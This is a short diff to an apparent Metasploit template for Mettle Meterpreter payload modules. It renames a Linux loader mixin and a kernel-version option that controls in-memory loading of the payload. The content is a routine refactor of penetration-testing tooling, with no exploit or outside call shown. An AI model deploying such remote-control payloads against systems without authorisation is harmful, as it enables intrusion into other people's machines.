@@ -10,7 +10,7 @@ module MetasploitModule
   include Msf::Payload::Single
   include Msf::Sessions::MeterpreterOptions::<%= platform.split('_').each { |s| s.casecmp?('osx') ? 'OSX' : s.capitalize! }.join %>
   include Msf::Sessions::MettleConfig
-  <% if platform.downcase == 'linux' %>include Msf::Payload::Linux::<%= arch.capitalize %>::MeterpreterLoader<% end %>
+  <% if platform.downcase == 'linux' %>include Msf::Payload::Linux::<%= arch.capitalize %>::ElfLoader<% end %>
   <% if platform.downcase == 'linux' %>include Msf::Payload::Linux::<%= arch.capitalize %>::Prepends<% end %>
 
   def initialize(info = {})
@@ -40,7 +40,7 @@ module MetasploitModule
     }.merge(mettle_logging_config)
     payload = MetasploitPayloads::Mettle.new('<%= payload %>', generate_config(opts)).to_binary :exec
     <% if platform.downcase == 'linux' %>ds = opts[:datastore] || datastore
-    if ds['MeterpreterLinuxMinKernel'] == '3.17+'
+    if ds['PayloadLinuxMinKernel'] == '3.17+'
       return in_memory_load(payload) + payload
     end<% end %>
     payload
